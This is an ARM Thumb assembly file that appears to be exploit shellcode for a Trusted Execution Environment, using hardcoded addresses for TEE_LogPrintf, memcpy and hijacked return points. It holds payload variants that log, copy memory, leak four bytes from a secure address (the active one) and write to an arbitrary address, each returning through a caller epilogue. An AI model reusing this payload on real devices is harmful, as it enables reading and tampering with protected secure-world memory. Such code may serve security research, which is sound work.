#define TEE_LogPrintf #0x08bac
#define memcpy #0x008ac8
#define ORIG_RET #0x095d3
#define CALLER_EPILOGUE_RET #0x0952d

.code 16
.thumb
//  ****************************************************************************
//  TEE_LogPrintf(r0)
//  ****************************************************************************
//  movw r0, #0xffe0;
//  movt r0, #0x35;
//  movw r1, TEE_LogPrintf;
//  blx r1
//  movw r1, ORIG_RET;
//  bx r1

//  ****************************************************************************
//  memcpy(r0, r1, r2)
//  r0 = <value> // leaks <value>
//  ****************************************************************************
//  movw r0, #0x8028;
//  movt r0, #0x81;
//  movw r1, #0x7d5c;
//  movt r1, #0x8000;
//  movw r2, #0x10;
//  movw r3, memcpy;
//  blx r3
//  movw r0, memcpy;
//  movt r0, #0xffff
//  movw r1, CALLER_EPILOGUE_RET;
//  bx r1

//  ****************************************************************************
//  leak 4 bytes
//  r0 = [r1] // leaks *r1
//  ****************************************************************************
  movw r1, 0x7e18
  movt r1, 0x8000
  ldr r0, [r1, #0x0]
  movw r1, CALLER_EPILOGUE_RET;
  bx r1

//  ****************************************************************************
//  write 2 bytes to [r1]
//  *r1 = r0
//  ****************************************************************************
//  movw r1, 0x8028
//  movt r1, 0x0081
//  movw r0, #0xff
//  str r0, [r1, #0x0]
//  movw r0, #0xffff
//  movt r0, #0xffff
//  movw r1, CALLER_EPILOGUE_RET;
//  bx r1
